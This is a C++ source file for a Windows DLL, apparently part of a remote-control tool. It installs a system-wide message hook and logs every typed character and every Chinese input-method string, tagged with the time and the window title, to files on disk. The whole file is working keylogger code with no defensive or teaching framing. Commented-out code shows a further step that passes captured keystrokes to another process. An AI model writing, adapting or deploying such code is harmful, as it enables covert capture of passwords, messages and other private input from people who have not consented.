// Input_Monitor.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include<windows.h>
#include<tchar.h>
#include<Imm.h>
#include<atlstr.h>
#include<time.h>

#pragma comment(lib,"Imm32.lib")

#include "Input_Moniter.h"

#pragma data_seg("Share")

HINSTANCE g_hHinstance = NULL;
HHOOK g_hHook;
HWND g_hLastFocus = NULL;


VOID DetailRecord()
{
	char t[280]="";
	HWND hFocus;       //保存当前活动窗口句柄
	char szTitle[256]= ""; //当前窗口名称

	hFocus = GetForegroundWindow();//GetActiveWindow(); 
	//取得当前活动窗口句柄
	//GetWindowText(hFocus, szTitle, 256);//当前窗口名称

	if (g_hLastFocus != hFocus)/*(strcmp(lastTitle, szTitle))  */          //当前活动窗口是否改变,改变则记录时间及窗口信息
	{                           
		GetWindowTextA(hFocus, szTitle, 256);
		g_hLastFocus = hFocus;

		//CTime pt;
		//CStringA time1, time2;
		//
		char* linebreak = "\r\n";
		//pt = CTime::GetCurrentTime();
		////星期，月，日，年
		//time1 = pt.Format("%Y-%m-%d ");
		////小时，分，秒
		//time2 = pt.Format("%H:%M:%S ");
		////a = time1.GetBuffer(0);
		struct tm *local;
		time_t TimeNow;
		TimeNow = time(NULL);
		local = localtime(&TimeNow);

		strcat(t, linebreak);
		strcat(t, asctime(local));
		//strcat(t, "  ");
		//strcat(t, time2);
		strcat(t, "  ");
		strcat(t, szTitle);
		strcat(t, linebreak);
		strcat(t, "    ");

		FILE* f = NULL;
		f = fopen("E:\\RemoteControlSever\\RESULT.txt", "ab+");
		if (f != NULL)
		{
			fwrite(t, strlen(t), 1, f);
			fclose(f);
		}		
	}
}



LRESULT CALLBACK GetMsgProc(int code,
	WPARAM wParam,
	LPARAM lParam)
{
	//code:Specifies whether the hook procedure must process the message.
	//If code is HC_ACTION, the hook procedure must process the message.
	if (HC_ACTION == code)
	{
		MSG *pMsg = (MSG*)lParam;
		switch (pMsg->message)
		{
			//Sent to an application when the IME changes composition status as a result of a keystroke.
		case WM_IME_COMPOSITION:
		{
								   if (wParam != PM_REMOVE)
									   break;
								   if (pMsg->lParam & GCS_RESULTSTR)
								   {
									   DetailRecord();
									   FILE* f1 = NULL;
									   f1 = fopen("E:\\RemoteControlSever\\report_cn.txt", "a+");
									   if (f1 != NULL)
									   {
											fprintf(f1, "\r\nWM_IME_COMPOSITION\r\n");
											fclose(f1);
									   }
									   //*********************************************UNICODE转换*****************************************
									   int iSize;	//IME结果字符串的大小	
									   LPSTR pszMultiByte = NULL;//IME结果字符串指针	
									   int ChineseSimpleAcp = 936;//宽字节转换时中文的编码	
									   //*********************************************UNICODE转换*****************************************
									   HIMC hImc = NULL;
									   DWORD dwSize;
									   TCHAR *lpStr;
									   //first get the window for current input to the input method handle
									   hImc = ImmGetContext(pMsg->hwnd);
									   //Get string length
									   dwSize = ImmGetCompositionString(hImc, GCS_RESULTSTR, NULL, 0);
									   lpStr = (TCHAR *)malloc((dwSize + 1)*sizeof(TCHAR));
									   memset(lpStr, 0, (dwSize + 1)*sizeof(TCHAR));
									   //get string
									   ImmGetCompositionString(hImc, GCS_RESULTSTR, lpStr, dwSize);
									   //*********************************************UNICODE转换*****************************************
									   iSize = WideCharToMultiByte(ChineseSimpleAcp, 0, lpStr, -1, NULL, 0, NULL, NULL);//计算将IME结果字符串转换为ASCII标准字节后的大小	
									   //为转换分配空间	
									   if (pszMultiByte)
									   {
										   delete[] pszMultiByte;
										   pszMultiByte = NULL;
									   }
									   pszMultiByte = new char[iSize + 1];
									   WideCharToMultiByte(ChineseSimpleAcp, 0, lpStr, -1, pszMultiByte, iSize, NULL, NULL);//宽字节转换	
									   pszMultiByte[iSize] = '\0';
									   FILE* f2 = NULL;
									   f2 = fopen("E:\\RemoteControlSever\\RESULT.txt", "ab+");
									   if (f2 != NULL)
									   {
										   fwrite(pszMultiByte, iSize, 1, f2);
										   fclose(f2);
									   }
									   //*********************************************UNICODE转换*****************************************
									   /*HANDLE m_hMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, _T("TestFileMap"));
									   LPTSTR lpMapAddr = (LPTSTR)MapViewOfFile(m_hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
									   *(HWND*)(lpMapAddr + 2) = GetActiveWindow();
									   wcscpy_s(lpMapAddr + 4, wcslen(lpStr)+1, lpStr);
									   UINT res = PostMessageW(*(HWND*)lpMapAddr, InputMonitorMsg, NULL, NULL);*/
									   free(lpStr);
									   ImmReleaseContext(pMsg->hwnd, hImc);
								   }
		}break;
		case WM_CHAR:
		{
						if (wParam != PM_REMOVE)
							break;
						if (pMsg->wParam >= 8 && pMsg->wParam <= 126)
						{
							DetailRecord();
							FILE* f1 = NULL;
							f1 = fopen("E:\\RemoteControlSever\\report_cn.txt", "a+");
							if (f1 != NULL)
							{
								fprintf(f1, "\r\nWM_CHAR\r\n");
								fclose(f1);
							}
							FILE* f2 = NULL;
							f2 = fopen("E:\\RemoteControlSever\\RESULT.txt", "ab+");
							if (f2 != NULL)
							{
								fwrite(&(pMsg->wParam), sizeof(char), 1, f2);
								fclose(f2);
							}
							/*HANDLE hMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, _T("TestFileMap"));
							LPTSTR lpMapAddr = (LPTSTR)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
							*(HWND*)(lpMapAddr + 2) = GetActiveWindow();
							*(lpMapAddr + 4) = (TCHAR)pMsg->wParam;
							*(lpMapAddr + 5) = '\0';
							UINT res = PostMessageW(*(HWND*)lpMapAddr, InputMonitorMsg, NULL, NULL);*/
						}
		}break;
		default:
		{
				   unsigned int mes;
				   PMSG pmsg = (PMSG)lParam;
				   mes = pmsg->message;
				   FILE* f1= NULL;
				   f1 = fopen("E:\\RemoteControlSever\\report_cn.txt", "a+");
				   if (f1 != NULL)
				   {					   
					   if (mes)
					   {
						   fprintf(f1, "\r\n");
						   fprintf(f1, "%d", mes);
					   }						   
					   fclose(f1);
				   }
		}break;
		}
	}
	return CallNextHookEx(g_hHook, code, wParam, lParam);
}

BOOL InstallHook()
{
	if (g_hHook)
		return TRUE;
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hHinstance, 0);
	return (g_hHook != NULL);
}

void UnHook()
{
	if (g_hHook)
	{
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
	}
}

BOOL APIENTRY DllMain(HANDLE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hHinstance = HINSTANCE(hModule);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		UnHook();
		break;
	}
	return TRUE;
}

